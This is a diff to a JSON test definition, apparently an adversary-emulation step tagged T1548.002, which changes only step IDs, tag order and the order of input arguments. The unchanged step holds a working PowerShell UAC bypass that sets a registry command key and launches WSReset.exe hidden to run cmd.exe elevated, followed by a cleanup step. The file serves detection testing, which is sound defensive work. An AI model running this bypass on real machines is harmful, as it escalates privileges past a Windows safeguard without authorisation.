@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "f6d89917-eb94-445a-8ab0-c88280a001c5",
+      "id": "a3d8c6c3-0b8e-4c4f-9c54-f1952433005d",
       "type": "execute-command",
       "data": {
         "command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "a588845a-bf03-4af7-9b99-534eef87a3ee",
+      "id": "a8d61980-8026-40d9-8c81-fe18240b993c",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item #{commandpath} -Recurse -Force\n",
@@ -27,32 +27,32 @@
   ],
   "flows": [
     {
-      "s": "f6d89917-eb94-445a-8ab0-c88280a001c5",
+      "s": "a3d8c6c3-0b8e-4c4f-9c54-f1952433005d",
       "p": "on-success",
-      "o": "a588845a-bf03-4af7-9b99-534eef87a3ee"
+      "o": "a8d61980-8026-40d9-8c81-fe18240b993c"
     },
     {
-      "s": "f6d89917-eb94-445a-8ab0-c88280a001c5",
+      "s": "a3d8c6c3-0b8e-4c4f-9c54-f1952433005d",
       "p": "on-failure",
-      "o": "a588845a-bf03-4af7-9b99-534eef87a3ee"
+      "o": "a8d61980-8026-40d9-8c81-fe18240b993c"
     }
   ],
   "tags": [
-    "T1548.002",
-    "atomic-red-team"
+    "T1548",
+    "T1548.002"
   ],
   "input_arguments": [
-    {
-      "name": "commandtorun",
-      "type": "string",
-      "description": "Command to run",
-      "value": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
-    },
     {
       "name": "commandpath",
       "type": "string",
       "description": "Registry path",
       "value": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
+    },
+    {
+      "name": "commandtorun",
+      "type": "string",
+      "description": "Command to run",
+      "value": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
     }
   ]
 }
